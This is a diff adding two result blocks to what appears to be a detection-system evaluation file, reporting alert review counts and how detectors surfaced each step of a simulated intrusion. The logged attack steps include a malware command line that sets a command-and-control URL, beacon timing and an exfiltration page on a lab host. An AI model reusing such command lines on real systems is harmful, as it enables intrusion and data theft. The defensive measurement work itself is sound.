@@ -553,6 +553,230 @@
     "logon",
     "lsass_access"
    ]
+  },
+  "gated_analyst_lift": {
+   "run": "gated_analyst_lift",
+   "test_cases": 432,
+   "outcomes": {
+    "REVIEW": 432
+   },
+   "reviews_per_day": {
+    "mean": 30.9,
+    "max": 124,
+    "week_1_mean": 25.0,
+    "week_2_mean": 36.7,
+    "by_day": [
+     31,
+     41,
+     61,
+     15,
+     19,
+     4,
+     4,
+     23,
+     124,
+     43,
+     32,
+     30,
+     3,
+     2
+    ]
+   },
+   "cases_by_ground_truth": {
+    "benign": {
+     "REVIEW": 360
+    },
+    "malicious": {
+     "REVIEW": 72
+    }
+   },
+   "labelled_events_alerted": {
+    "class_1": 400
+   },
+   "attack_steps": [
+    {
+     "step": "Initial access on client 2 (phishing macro, dropper)",
+     "time": "2025-01-06T10:00:00+00:00",
+     "host": "CLIENT2",
+     "surfaced_cases": 20,
+     "first_after_min": 1.2,
+     "first": {
+      "detector": "exec_file_write",
+      "process_name": "powershell.exe",
+      "parent_process": null,
+      "command_line": null,
+      "outcome": "REVIEW"
+     }
+    },
+    {
+     "step": "Lateral movement to client 1 (PrintNightmare)",
+     "time": "2025-01-08T15:00:00+00:00",
+     "host": "CLIENT1",
+     "surfaced_cases": 11,
+     "first_after_min": 28.5,
+     "first": {
+      "detector": "lineage",
+      "process_name": "svcmon.exe",
+      "parent_process": "taskhostw.exe",
+      "command_line": "C:\\Users\\client1\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.php --exfiltration-page login.php",
+      "outcome": "REVIEW"
+     }
+    },
+    {
+     "step": "Collection: client 1 to the internal server over SSH",
+     "time": "2025-01-10T11:00:00+00:00",
+     "host": "CLIENT1",
+     "surfaced_cases": 11,
+     "first_after_min": 30.0,
+     "first": {
+      "detector": "pipe",
+      "process_name": "svcmon.exe",
+      "parent_process": null,
+      "command_line": null,
+      "outcome": "REVIEW"
+     }
+    },
+    {
+     "step": "Exfiltration to the attacker",
+     "time": "2025-01-11T11:00:00+00:00",
+     "host": "CLIENT1",
+     "surfaced_cases": 4,
+     "first_after_min": 1265.0,
+     "first": {
+      "detector": "lineage",
+      "process_name": "svcmon.exe",
+      "parent_process": "explorer.exe",
+      "command_line": "\"C:\\Users\\client1\\AppData\\Local\\Temp\\svcmon.exe\" ",
+      "outcome": "REVIEW"
+     }
+    }
+   ],
+   "attack_keys_learned_as_routine": {},
+   "analyst_verdicts": {
+    "benign": 360,
+    "malicious": 72
+   },
+   "detectors": [
+    "lineage",
+    "pipe",
+    "exec_file_write",
+    "powershell",
+    "logon",
+    "lsass_access"
+   ]
+  },
+  "gated_nce_analyst_lift": {
+   "run": "gated_nce_analyst_lift",
+   "test_cases": 450,
+   "outcomes": {
+    "REVIEW": 420,
+    "NO_ACTIONABLE": 30
+   },
+   "reviews_per_day": {
+    "mean": 30.0,
+    "max": 121,
+    "week_1_mean": 24.6,
+    "week_2_mean": 35.4,
+    "by_day": [
+     31,
+     38,
+     61,
+     15,
+     19,
+     4,
+     4,
+     21,
+     121,
+     42,
+     29,
+     30,
+     3,
+     2
+    ]
+   },
+   "cases_by_ground_truth": {
+    "benign": {
+     "REVIEW": 348,
+     "NO_ACTIONABLE": 30
+    },
+    "malicious": {
+     "REVIEW": 72
+    }
+   },
+   "labelled_events_alerted": {
+    "class_1": 400
+   },
+   "attack_steps": [
+    {
+     "step": "Initial access on client 2 (phishing macro, dropper)",
+     "time": "2025-01-06T10:00:00+00:00",
+     "host": "CLIENT2",
+     "surfaced_cases": 20,
+     "first_after_min": 1.2,
+     "first": {
+      "detector": "exec_file_write",
+      "process_name": "powershell.exe",
+      "parent_process": null,
+      "command_line": null,
+      "outcome": "REVIEW"
+     }
+    },
+    {
+     "step": "Lateral movement to client 1 (PrintNightmare)",
+     "time": "2025-01-08T15:00:00+00:00",
+     "host": "CLIENT1",
+     "surfaced_cases": 11,
+     "first_after_min": 28.5,
+     "first": {
+      "detector": "lineage",
+      "process_name": "svcmon.exe",
+      "parent_process": "taskhostw.exe",
+      "command_line": "C:\\Users\\client1\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.php --exfiltration-page login.php",
+      "outcome": "REVIEW"
+     }
+    },
+    {
+     "step": "Collection: client 1 to the internal server over SSH",
+     "time": "2025-01-10T11:00:00+00:00",
+     "host": "CLIENT1",
+     "surfaced_cases": 11,
+     "first_after_min": 30.0,
+     "first": {
+      "detector": "pipe",
+      "process_name": "svcmon.exe",
+      "parent_process": null,
+      "command_line": null,
+      "outcome": "REVIEW"
+     }
+    },
+    {
+     "step": "Exfiltration to the attacker",
+     "time": "2025-01-11T11:00:00+00:00",
+     "host": "CLIENT1",
+     "surfaced_cases": 4,
+     "first_after_min": 1265.0,
+     "first": {
+      "detector": "lineage",
+      "process_name": "svcmon.exe",
+      "parent_process": "explorer.exe",
+      "command_line": "\"C:\\Users\\client1\\AppData\\Local\\Temp\\svcmon.exe\" ",
+      "outcome": "REVIEW"
+     }
+    }
+   ],
+   "attack_keys_learned_as_routine": {},
+   "analyst_verdicts": {
+    "benign": 348,
+    "malicious": 72
+   },
+   "detectors": [
+    "lineage",
+    "pipe",
+    "exec_file_write",
+    "powershell",
+    "logon",
+    "lsass_access"
+   ]
   }
  }
 }
